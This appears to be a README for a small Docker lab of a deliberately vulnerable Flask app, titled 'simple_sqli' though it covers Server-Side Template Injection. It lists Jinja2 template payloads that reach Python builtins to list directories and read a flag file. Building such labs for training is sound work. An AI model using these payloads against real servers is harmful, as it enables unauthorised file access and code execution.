# simple_sqli

Very simple SSTI(Server-Side Template Injection) environment with docker

## Environment

docker-compose.yml for ssti on flask

- Python: 3.7
- Flask: 1.1.2

## How to setup

```
$ docker-compose up
```

## How to exploit

Please visit localhost:5000

![home](./images/sc.png)

First, you can check directory like this:

```
{{request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__('os').listdir('./')}}
```

and like this:

```
{{request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__('os').listdir('./flag')}}
```

You can get the flag like this:

```
{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['open']('./flag/flag.txt').read()}}
```
